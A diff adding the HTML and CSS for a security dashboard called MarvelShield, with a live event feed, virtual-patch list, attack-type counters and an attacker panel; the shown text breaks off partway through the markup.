@@ -1,0 +1,2208 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MarvelShield — Live Attack Dashboard</title>
+  <!-- Loaded from bridge.js (same origin) — eliminates version mismatch and file:// CORS issues -->
+  <script src="/socket.io/socket.io.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+/* ── Reset & Base ────────────────────────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:         #e8eef8;
+  --sidebar:    #1b2048;
+  --sidebar2:   #141838;
+  --s-border:   #252d5c;
+  --card:       #ffffff;
+  --card-alt:   #f4f7ff;
+  --border:     #dce5f5;
+  --primary:    #4f7ff7;
+  --purple:     #7c3aed;
+  --purple-lt:  #8b5cf6;
+  --green:      #22c55e;
+  --red:        #ef4444;
+  --yellow:     #f59e0b;
+  --orange:     #f97316;
+  --txt-h:    #1e293b;
+  --txt:      #334155;
+  --txt-mid:  #64748b;
+  --txt-dim:  #94a3b8;
+  --s-txt:    #c8d0e8;
+  --s-txt-dim:#6b7aa0;
+  --font:      'Inter', system-ui, sans-serif;
+  --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+  --radius:    12px;
+  --radius-sm: 8px;
+  --shadow:    0 1px 3px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.06);
+  --shadow-lg: 0 8px 32px rgba(0,0,0,0.12);
+}
+
+body {
+  background: var(--bg);
+  color: var(--txt);
+  font-family: var(--font);
+  font-size: 14px;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── Scrollbars ──────────────────────────────────────────────────────────── */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { border-radius: 4px; background: rgba(79,127,247,0.25); }
+
+.sidebar-scroll::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.12); }
+.sidebar-scroll::-webkit-scrollbar-track { background: transparent; }
+
+/* ── Header ──────────────────────────────────────────────────────────────── */
+header {
+  background: linear-gradient(135deg, #1b2048 0%, #252d5c 100%);
+  border-bottom: 3px solid transparent;
+  border-image: linear-gradient(90deg, #7c3aed, #4f7ff7) 1;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 24px;
+  height: 60px;
+  position: sticky;
+  top: 0;
+  z-index: 200;
+  box-shadow: 0 2px 16px rgba(0,0,0,0.25);
+}
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.mute-btn {
+  background: rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.12);
+  color: var(--txt-mid);
+  border-radius: 8px;
+  padding: 5px 10px;
+  font-size: 14px;
+  cursor: pointer;
+  transition: background 0.2s, color 0.2s;
+  user-select: none;
+  line-height: 1;
+}
+.mute-btn:hover { background: rgba(255,255,255,0.12); color: #fff; }
+.mute-btn.muted { color: #e55; border-color: rgba(229,85,85,0.3); }
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.logo-icon {
+  font-size: 26px;
+  filter: drop-shadow(0 0 8px rgba(79,127,247,0.6));
+}
+
+.logo-text {
+  font-size: 18px;
+  font-weight: 700;
+  color: #fff;
+  letter-spacing: -0.3px;
+}
+
+.logo-sub {
+  font-size: 11px;
+  color: var(--s-txt-dim);
+  letter-spacing: 0.2px;
+  margin-top: 1px;
+}
+
+/* ── Status pill ─────────────────────────────────────────────────────────── */
+.status-pill {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  padding: 5px 14px;
+  border-radius: 99px;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.6px;
+  text-transform: uppercase;
+  border: 1px solid transparent;
+  transition: all 0.3s ease;
+}
+.status-pill.online {
+  background: rgba(34,197,94,0.15);
+  border-color: rgba(34,197,94,0.4);
+  color: #4ade80;
+}
+.status-pill.offline {
+  background: rgba(239,68,68,0.15);
+  border-color: rgba(239,68,68,0.4);
+  color: #f87171;
+}
+
+.pulse {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: currentColor;
+  display: inline-block;
+}
+.status-pill.online .pulse {
+  animation: pulse 1.5s infinite;
+}
+
+/* ── Stats Bar ───────────────────────────────────────────────────────────── */
+.stats-bar {
+  display: grid;
+  grid-template-columns: repeat(7, 1fr);
+  gap: 12px;
+  padding: 16px 20px;
+  background: var(--bg);
+}
+
+.stat {
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: 14px 16px;
+  border-top: 3px solid var(--accent, var(--primary));
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+.stat:hover { transform: translateY(-1px); box-shadow: var(--shadow-lg); }
+
+.stat.total   { --accent: var(--primary); }
+.stat.attacks { --accent: var(--red); }
+.stat.clean   { --accent: var(--green); }
+.stat.blocked { --accent: var(--yellow); }
+.stat.patches { --accent: var(--purple); }
+
+.stat-icon {
+  font-size: 18px;
+  margin-bottom: 4px;
+}
+
+.stat-value {
+  font-size: 26px;
+  font-weight: 700;
+  color: var(--txt-h);
+  line-height: 1;
+  letter-spacing: -0.5px;
+}
+.stat.attacks .stat-value { color: var(--red); }
+.stat.clean   .stat-value { color: var(--green); }
+.stat.blocked .stat-value { color: var(--yellow); }
+.stat.patches .stat-value { color: var(--purple); }
+
+.stat-label {
+  font-size: 11px;
+  color: var(--txt-mid);
+  font-weight: 500;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+
+/* ── Main layout ─────────────────────────────────────────────────────────── */
+.main {
+  display: grid;
+  grid-template-columns: 380px 1fr;
+  gap: 0;
+  min-height: calc(100vh - 60px - 90px - 60px);
+}
+
+/* ── Feed Panel (sidebar) ────────────────────────────────────────────────── */
+.feed-panel {
+  background: var(--sidebar);
+  display: flex;
+  flex-direction: column;
+  border-right: 1px solid var(--s-border);
+  overflow: hidden;
+}
+
+.feed-panel .panel-header {
+  background: var(--sidebar2);
+  border-bottom: 1px solid var(--s-border);
+  color: var(--s-txt);
+}
+
+#event-feed {
+  flex: 1;
+  overflow-y: auto;
+  min-height: 0;
+}
+#event-feed.sidebar-scroll { }
+
+/* ── Panel header (shared) ───────────────────────────────────────────────── */
+.panel-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 16px;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.3px;
+  color: var(--txt-mid);
+  background: var(--card);
+  border-bottom: 1px solid var(--border);
+  border-radius: var(--radius) var(--radius) 0 0;
+  text-transform: uppercase;
+}
+
+.panel-header span:last-child {
+  font-weight: 400;
+  color: var(--txt-dim);
+}
+
+/* ── TTN Banner ──────────────────────────────────────────────────────────── */
+.ttn-banner {
+  background: var(--sidebar2);
+  border-top: 1px solid var(--s-border);
+  padding: 10px 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 12px;
+  color: var(--s-txt-dim);
+  flex-shrink: 0;
+}
+
+.ttn-label { color: var(--s-txt-dim); }
+.ttn-unit  { color: var(--s-txt-dim); font-size: 10px; }
+
+#ttn-value {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--green);
+}
+
+/* ── Events in sidebar ───────────────────────────────────────────────────── */
+.event {
+  padding: 8px 12px;
+  border-bottom: 1px solid rgba(255,255,255,0.05);
+  display: flex;
+  gap: 8px;
+  align-items: flex-start;
+  border-left: 3px solid transparent;
+  animation: slideIn 0.25s ease;
+  transition: background 0.15s;
+}
+.event:hover { background: rgba(255,255,255,0.04); }
+
+.event.incoming   { border-left-color: var(--s-txt-dim); }
+.event.malicious  { border-left-color: var(--red); background: rgba(239,68,68,0.06); }
+.event.clean      { border-left-color: var(--green); }
+.event.patched    { border-left-color: var(--purple-lt); background: rgba(139,92,246,0.06); }
+.event.blocked    { border-left-color: var(--yellow); background: rgba(245,158,11,0.06); }
+
+.event-icon {
+  font-size: 14px;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+.event-body { flex: 1; min-width: 0; }
+
+.event-title {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--s-txt);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  flex-wrap: wrap;
+}
+
+.event-type {
+  font-size: 10px;
+  font-weight: 700;
+  padding: 1px 6px;
+  border-radius: 4px;
+  background: rgba(79,127,247,0.2);
+  color: #93bbff;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+.event.malicious .event-type  { background: rgba(239,68,68,0.2); color: #fca5a5; }
+.event.patched   .event-type  { background: rgba(139,92,246,0.2); color: #c4b5fd; }
+.event.blocked   .event-type  { background: rgba(245,158,11,0.2); color: #fcd34d; }
+.event.clean     .event-type  { background: rgba(34,197,94,0.2); color: #86efac; }
+
+.event-method {
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--primary);
+}
+.event-path {
+  font-size: 11px;
+  color: var(--s-txt-dim);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  margin-top: 2px;
+}
+.event-detail {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--s-txt-dim);
+  margin-top: 2px;
+  word-break: break-all;
+}
+.event-time {
+  font-size: 10px;
+  color: var(--s-txt-dim);
+  flex-shrink: 0;
+  margin-top: 2px;
+  white-space: nowrap;
+}
+
+.highlight { color: var(--red); font-weight: 600; }
+.patch-re  { color: var(--purple-lt); }
+.neutralized { color: var(--green); font-weight: 600; }
+.ip { font-family: var(--font-mono); font-size: 10px; color: var(--primary); }
+
+/* ── Side panel (right area) ─────────────────────────────────────────────── */
+.side-panel {
+  padding: 16px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  overflow-y: auto;
+  background: var(--bg);
+}
+
+/* ── Patches panel card ──────────────────────────────────────────────────── */
+.patches-card {
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  overflow: hidden;
+  border-top: 3px solid var(--purple);
+}
+.patches-card .panel-header {
+  border-radius: 0;
+  border-top: none;
+}
+
+#patches-list {
+  padding: 8px;
+  max-height: 280px;
+  overflow-y: auto;
+}
+
+.no-patches {
+  padding: 24px 16px;
+  text-align: center;
+  color: var(--txt-dim);
+  font-size: 13px;
+  line-height: 1.6;
+}
+
+.patch-item {
+  background: var(--card-alt);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 10px 12px;
+  margin-bottom: 8px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+  border-left: 3px solid var(--purple);
+}
+.patch-item:hover { box-shadow: var(--shadow); transform: translateX(2px); }
+.patch-item.expired { opacity: 0.5; border-left-color: var(--txt-dim); }
+
+.patch-index {
+  font-size: 10px;
+  color: var(--txt-dim);
+  font-weight: 500;
+}
+.patch-severity {
+  font-size: 10px;
+  font-weight: 700;
+  padding: 2px 7px;
+  border-radius: 4px;
+  text-transform: uppercase;
+}
+.sev-CRITICAL { background: rgba(239,68,68,0.15); color: var(--red); }
+.sev-HIGH     { background: rgba(249,115,22,0.15); color: var(--orange); }
+.sev-MEDIUM   { background: rgba(245,158,11,0.15); color: var(--yellow); }
+.sev-LOW      { background: rgba(34,197,94,0.15); color: var(--green); }
+
+.patch-attack-type {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--txt-h);
+}
+.patch-regex {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--purple);
+  background: rgba(124,58,237,0.06);
+  padding: 3px 6px;
+  border-radius: 4px;
+  margin-top: 4px;
+  word-break: break-all;
+}
+.patch-reasoning {
+  font-size: 11px;
+  color: var(--txt-mid);
+  margin-top: 4px;
+  line-height: 1.4;
+}
+.patch-definition {
+  font-size: 11px;
+  color: var(--txt-dim);
+  background: rgba(79,127,247,0.06);
+  border-left: 2px solid rgba(79,127,247,0.35);
+  padding: 5px 8px;
+  border-radius: 0 4px 4px 0;
+  margin-top: 5px;
+  line-height: 1.45;
+  font-style: italic;
+}
+.patch-footer {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-top: 6px;
+  font-size: 10px;
+  color: var(--txt-dim);
+  flex-wrap: wrap;
+}
+
+.provisional-badge {
+  font-size: 9px;
+  font-weight: 700;
+  padding: 2px 6px;
+  border-radius: 4px;
+  background: rgba(245,158,11,0.15);
+  color: var(--yellow);
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+
+.fp-badge {
+  font-size: 10px;
+  font-weight: 600;
+  padding: 2px 7px;
+  border-radius: 4px;
+}
+.fp-badge.fp-clean   { background: rgba(34,197,94,0.12); color: var(--green); }
+.fp-badge.fp-warning { background: rgba(245,158,11,0.12); color: var(--yellow); }
+
+/* ── Export WAF button ───────────────────────────────────────────────────── */
+#export-waf-btn {
+  font-size: 10px;
+  padding: 4px 10px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--purple);
+  background: rgba(124,58,237,0.08);
+  color: var(--purple);
+  cursor: pointer;
+  font-family: var(--font);
+  font-weight: 600;
+  transition: all 0.15s ease;
+}
+#export-waf-btn:hover { background: rgba(124,58,237,0.18); }
+
+/* ── Breakdown panel ─────────────────────────────────────────────────────── */
+.breakdown-panel {
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: 16px;
+  border-top: 3px solid var(--primary);
+}
+
+.breakdown-title {
+  font-size: 12px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+  color: var(--txt-mid);
+  margin-bottom: 12px;
+}
+
+.breakdown-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+.breakdown-row:last-child { margin-bottom: 0; }
+
+.breakdown-label {
+  font-size: 12px;
+  color: var(--txt);
+  width: 100px;
+  flex-shrink: 0;
+  font-weight: 500;
+}
+
+.breakdown-bar-bg {
+  flex: 1;
+  height: 8px;
+  background: var(--border);
+  border-radius: 99px;
+  overflow: hidden;
+}
+.breakdown-bar {
+  height: 100%;
+  border-radius: 99px;
+  background: var(--primary);
+  transition: width 0.5s ease;
+}
+
+.breakdown-count {
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--txt-h);
+  width: 24px;
+  text-align: right;
+  flex-shrink: 0;
+}
+
+/* ── Attacker intel panel ────────────────────────────────────────────────── */
+.attacker-panel {
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  overflow: hidden;
+  border-top: 3px solid var(--red);
+}
+
+.attacker-panel .panel-header {
+  border-radius: 0;
+  border-top: none;
+}
+
+#attacker-list {
+  max-height: 220px;
+  overflow-y: auto;
+}
+
+.attacker-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 14px;
+  border-bottom: 1px solid var(--border);
+  transition: background 0.15s;
+}
+.attacker-row:last-child { border-bottom: none; }
+.attacker-row:hover { background: var(--card-alt); }
+
+.attacker-ip {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--txt-h);
+  flex: 1;
+}
+
+.attacker-count {
+  font-size: 11px;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 99px;
+}
+.attacker-count.c1  { background: rgba(245,158,11,0.12); color: var(--yellow); }
+.attacker-count.c2  { background: rgba(249,115,22,0.12); color: var(--orange); }
+.attacker-count.c3p { background: rgba(239,68,68,0.12); color: var(--red); }
+
+.attacker-types {
+  font-size: 10px;
+  color: var(--txt-dim);
+}
+
+.attacker-status {
+  font-size: 10px;
+  font-weight: 700;
+  padding: 2px 7px;
+  border-radius: 99px;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+.attacker-status.active { background: rgba(245,158,11,0.12); color: var(--yellow); }
+.attacker-status.banned { background: rgba(239,68,68,0.12); color: var(--red); }
+
+.ban-flash {
+  animation: ban-fade 1.5s ease;
+}
+
+/* ── Timeline section ────────────────────────────────────────────────────── */
+.timeline-section {
+  padding: 0 20px 24px;
+  background: var(--bg);
+}
+
+.timeline-section > .panel-header {
+  background: transparent;
+  border-radius: 0;
+  border-bottom: 2px solid var(--border);
+  padding: 12px 0;
+  margin-bottom: 16px;
+  border-radius: 0;
+}
+
+#timeline-entries {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.tl-empty {
+  padding: 32px;
+  text-align: center;
+  color: var(--txt-dim);
+  font-size: 13px;
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+}
+
+.tl-entry {
+  background: var(--card);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  overflow: hidden;
+  border-left: 4px solid var(--border);
+  animation: slideIn 0.3s ease;
+}
+.tl-entry.tl-status-blocked  { border-left-color: var(--red); }
+.tl-entry.tl-status-patched  { border-left-color: var(--purple); }
+.tl-entry.tl-status-diagnosed { border-left-color: var(--yellow); }
+
+.tl-entry-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 14px;
+  background: var(--card-alt);
+  border-bottom: 1px solid var(--border);
+  flex-wrap: wrap;
+}
+
+.tl-trace-id {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--txt-dim);
+}
+
+.tl-attack-badge {
+  font-size: 11px;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 4px;
+  background: rgba(239,68,68,0.1);
+  color: var(--red);
+  text-transform: uppercase;
+}
+
+.tl-sev-badge {
+  font-size: 10px;
+  font-weight: 700;
+  padding: 2px 7px;
+  border-radius: 4px;
+  text-transform: uppercase;
+}
+
+.tl-status-badge {
+  font-size: 10px;
+  font-weight: 700;
+  padding: 2px 8px;
+  border-radius: 99px;
+  margin-left: auto;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+.tl-status-badge.received  { background: rgba(100,116,139,0.1); color: var(--txt-mid); }
+.tl-status-badge.diagnosed { background: rgba(245,158,11,0.12); color: var(--yellow); }
+.tl-status-badge.patched   { background: rgba(124,58,237,0.12); color: var(--purple); }
+.tl-status-badge.blocked   { background: rgba(239,68,68,0.12); color: var(--red); }
+
+.tl-steps {
+  padding: 10px 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.tl-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 6px 0;
+  border-bottom: 1px solid var(--border);
+}
+.tl-step:last-child { border-bottom: none; }
+
+.tl-step::before {
+  content: '●';
+  font-size: 8px;
+  flex-shrink: 0;
+  margin-top: 4px;
+  color: var(--txt-dim);
+}
+.tl-step.tl-received::before   { color: var(--txt-dim); }
+.tl-step.tl-diagnosed::before  { color: var(--yellow); }
+.tl-step.tl-patched::before    { color: var(--purple); }
+.tl-step.tl-blocked::before    { color: var(--red); }
+.tl-step.tl-fp_test::before    { color: var(--green); }
+.tl-step.tl-expired::before    { color: var(--txt-dim); }
+
+.tl-step-time {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--txt-dim);
+  flex-shrink: 0;
+  width: 80px;
+}
+
+.tl-step-body {
+  flex: 1;
+  font-size: 12px;
+  color: var(--txt);
+  line-height: 1.5;
+}
+
+.tl-step-sub {
+  font-size: 10px;
+  color: var(--txt-dim);
+  margin-top: 2px;
+}
+
+.tl-delta {
+  font-size: 10px;
+  color: var(--green);
+  font-weight: 600;
+  background: rgba(34,197,94,0.08);
+  padding: 1px 6px;
+  border-radius: 4px;
+  flex-shrink: 0;
+}
+
+.tl-pending {
+  font-size: 11px;
+  color: var(--txt-dim);
+  padding: 6px 0;
+  font-style: italic;
+}
+
+/* ── Modal overlay ───────────────────────────────────────────────────────── */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(10,14,23,0.75);
+  backdrop-filter: blur(4px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 900;
+  padding: 24px;
+}
+.modal-overlay.open { display: flex; }
+
+.modal-card {
+  background: #13192e;
+  border: 1px solid #2a3558;
+  border-radius: 16px;
+  box-shadow: 0 24px 80px rgba(0,0,0,0.5);
+  width: 100%;
+  max-width: 580px;
+  max-height: 90vh;
+  overflow-y: auto;
+  animation: modalIn 0.25s ease;
+  color: #c8d0e8;
+}
+
+.modal-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px;
+  border-bottom: 1px solid #2a3558;
+  background: #0d1226;
+  border-radius: 16px 16px 0 0;
+}
+
+.modal-title {
+  font-size: 13px;
+  font-weight: 700;
+  color: #e2e8f0;
+  letter-spacing: 0.4px;
+}
+
+.modal-close {
+  background: none;
+  border: none;
+  color: #6b7aa0;
+  cursor: pointer;
+  font-size: 16px;
+  padding: 2px 6px;
+  border-radius: 4px;
+  transition: color 0.15s;
+}
+.modal-close:hover { color: #e2e8f0; }
+
+.modal-body { padding: 20px; }
+
+.modal-hero {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid #2a3558;
+}
+
+.modal-sev-badge {
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 10px;
+  border-radius: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+
+.modal-attack-name {
+  font-size: 16px;
+  font-weight: 700;
+  color: #e2e8f0;
+}
+
+.modal-section {
+  margin-bottom: 16px;
+}
+
+.modal-section-label {
+  font-size: 10px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  color: #6b7aa0;
+  margin-bottom: 6px;
+}
+
+.modal-section-value {
+  font-size: 13px;
+  color: #c8d0e8;
+  line-height: 1.6;
+}
+
+.modal-regex-box {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: #0d1226;
+  border: 1px solid #2a3558;
+  border-radius: var(--radius-sm);
+  padding: 8px 12px;
+}
+
+.modal-regex-text {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: #c4b5fd;
+  flex: 1;
+  word-break: break-all;
+}
+
+.modal-copy-btn {
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 4px;
+  border: 1px solid #2a3558;
+  background: rgba(255,255,255,0.05);
+  color: #6b7aa0;
+  cursor: pointer;
+  font-family: var(--font);
+  transition: all 0.15s;
+  flex-shrink: 0;
+}
+.modal-copy-btn:hover { color: #c8d0e8; }
+.modal-copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+.modal-payloads { margin-top: 4px; }
+
+.modal-payload-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 4px 0;
+  font-size: 12px;
+  border-bottom: 1px solid #1e2a45;
+}
+.modal-payload-row:last-child { border-bottom: none; }
+
+.modal-payload-match   { color: var(--red); font-family: var(--font-mono); font-size: 11px; }
+.modal-payload-nomatch { color: var(--green); font-family: var(--font-mono); font-size: 11px; }
+.modal-payload-label   { font-size: 10px; color: #6b7aa0; }
+
+.conf-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.conf-label {
+  font-size: 11px;
+  color: #6b7aa0;
+  flex-shrink: 0;
+}
+
+.conf-bar-wrap {
+  flex: 1;
+  height: 8px;
+  background: #1e2a45;
+  border-radius: 99px;
+  overflow: hidden;
+}
+
+.conf-bar-fill {
+  height: 100%;
+  border-radius: 99px;
+  transition: width 0.5s ease;
+}
+
+.conf-high   .conf-bar-fill { background: var(--green); }
+.conf-medium .conf-bar-fill { background: var(--yellow); }
+.conf-low    .conf-bar-fill { background: var(--red); }
+
+.conf-pct {
+  font-size: 12px;
+  font-weight: 700;
+  color: #c8d0e8;
+  width: 36px;
+  text-align: right;
+  flex-shrink: 0;
+}
+
+.modal-meta-row {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex-wrap: wrap;
+  margin-bottom: 16px;
+  padding: 10px 12px;
+  background: #0d1226;
+  border-radius: var(--radius-sm);
+  font-size: 11px;
+  color: #6b7aa0;
+}
+
+.modal-status-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--green);
+  display: inline-block;
+}
+
+/* ── WAF tabs ────────────────────────────────────────────────────────────── */
+.waf-tab {
+  padding: 5px 14px;
+  border-radius: 6px;
+  border: 1px solid #2a3558;
+  background: transparent;
+  color: #6b7aa0;
+  font-size: 12px;
+  font-family: var(--font);
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.waf-tab:hover { color: #c8d0e8; }
+.waf-tab.active {
+  background: rgba(124,58,237,0.2);
+  border-color: var(--purple);
+  color: #c4b5fd;
+  font-weight: 600;
+}
+
+/* ── Animations ──────────────────────────────────────────────────────────── */
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50%       { opacity: 0.5; transform: scale(0.85); }
+}
+
+@keyframes flash {
+  0%   { background: rgba(79,127,247,0.25); }
+  100% { background: transparent; }
+}
+
+@keyframes slideIn {
+  from { opacity: 0; transform: translateY(-6px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes ban-fade {
+  0%   { background: rgba(239,68,68,0.25); }
+  100% { background: transparent; }
+}
+
+@keyframes modalIn {
+  from { opacity: 0; transform: scale(0.96) translateY(12px); }
+  to   { opacity: 1; transform: scale(1) translateY(0); }
+}
+
+.flash { animation: flash 0.4s ease; }
+</style>
+</head>
+
+<body>
+<!-- ── Header ─────────────────────────────────────────────────────────────── -->
+<header>
+  <div class="logo">
+    <span class="logo-icon">🛡️</span>
+    <div>
+      <div class="logo-text">MarvelShield</div>
+      <div class="logo-sub">AI-Powered Self-Healing Security Gateway</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <button id="mute-btn" class="mute-btn" title="Toggle alert sounds">🔊</button>
+    <div id="conn-status" class="status-pill offline">
+      <span class="pulse"></span>
+      <span id="conn-label">DISCONNECTED</span>
+    </div>
+  </div>
+</header>
+
+<!-- ── Stats Bar ──────────────────────────────────────────────────────────── -->
+<div class="stats-bar">
+  <div class="stat total">
+    <div class="stat-icon">📊</div>
+    <div class="stat-value" id="s-total">0</div>
+    <div class="stat-label">Total Requests</div>
+  </div>
+  <div class="stat attacks">
+    <div class="stat-icon">⚠️</div>
+    <div class="stat-value" id="s-attacks">0</div>
+    <div class="stat-label">Attacks Detected</div>
+  </div>
+  <div class="stat clean">
+    <div class="stat-icon">✅</div>
+    <div class="stat-value" id="s-clean">0</div>
+    <div class="stat-label">Clean Requests</div>
+  </div>
+  <div class="stat blocked">
+    <div class="stat-icon">🚫</div>
+    <div class="stat-value" id="s-blocked">0</div>
+    <div class="stat-label">Requests Blocked</div>
+  </div>
+  <div class="stat patches">
+    <div class="stat-icon">🩹</div>
+    <div class="stat-value" id="s-patches">0</div>
+    <div class="stat-label">Active Patches</div>
+  </div>
+  <div class="stat" style="--accent:var(--red);">
+    <div class="stat-icon">🚨</div>
+    <div class="stat-value" id="s-banned" style="color:var(--red);">0</div>
+    <div class="stat-label">IPs Banned</div>
+  </div>
+  <div class="stat" style="--accent:var(--green);">
+    <div class="stat-icon">🔍</div>
+    <div class="stat-value" id="s-fp-clean" style="color:var(--green);">—</div>
+    <div class="stat-label">False Positives</div>
+  </div>
+</div>
+
+<!-- ── Main Layout ────────────────────────────────────────────────────────── -->
+<div class="main">
+
+  <!-- ── Left Sidebar: Live Event Feed ──────────────────────────────────── -->
+  <div class="feed-panel">
+    <div class="panel-header">
+      <span>⚡ Live Event Stream</span>
+      <span id="event-count">0 events</span>
+    </div>
+    <div id="event-feed" class="sidebar-scroll"></div>
+    <div class="ttn-banner">
+      <span class="ttn-label">⏱ Last Time-to-Neutralize:</span>
+      <span id="ttn-value">—</span>
+      <span class="ttn-unit">seconds</span>
+    </div>
+  </div>
+
+  <!-- ── Right Panel ────────────────────────────────────────────────────── -->
+  <div class="side-panel">
+
+    <!-- Patches card -->
+    <div class="patches-card">
+      <div class="panel-header">
+        <span>🩹 Active Virtual Patches</span>
+        <span style="display:flex;align-items:center;gap:8px;">
+          <span id="patch-count">0</span>
+          <button id="export-waf-btn" title="Export as Nginx / AWS WAF / ModSecurity rules">
+            ⬇ Export WAF
+          </button>
+        </span>
+      </div>
+      <div id="patches-list">
+        <div class="no-patches">No patches deployed yet.<br/>Waiting for first attack…</div>
+      </div>
+    </div>
+
+    <!-- Attack Breakdown card -->
+    <div class="breakdown-panel">
+      <div class="breakdown-title">⚡ Attack Type Breakdown</div>
+      <div class="breakdown-row" id="br-cmd">
+        <span class="breakdown-label">Cmd Injection</span>
+        <div class="breakdown-bar-bg"><div class="breakdown-bar" id="bb-cmd" style="width:0%"></div></div>
+        <span class="breakdown-count" id="bc-cmd">0</span>
+      </div>
+      <div class="breakdown-row" id="br-ssrf">
+        <span class="breakdown-label">SSRF</span>
+        <div class="breakdown-bar-bg"><div class="breakdown-bar" id="bb-ssrf" style="width:0%;background:var(--purple-lt)"></div></div>
+        <span class="breakdown-count" id="bc-ssrf">0</span>
+      </div>
+      <div class="breakdown-row" id="br-sqli">
+        <span class="breakdown-label">SQL Injection</span>
+        <div class="breakdown-bar-bg"><div class="breakdown-bar" id="bb-sqli" style="width:0%;background:var(--yellow)"></div></div>
+        <span class="breakdown-count" id="bc-sqli">0</span>
+      </div>
+      <div class="breakdown-row" id="br-other">
+        <span class="breakdown-label">Other</span>
+        <div class="breakdown-bar-bg"><div class="breakdown-bar" id="bb-other" style="width:0%;background:var(--primary)"></div></div>
+        <span class="breakdown-count" id="bc-other">0</span>
+      </div>
+    </div>
+
+    <!-- Attacker Intel card -->
+    <div class="attacker-panel">
+      <div class="panel-header">
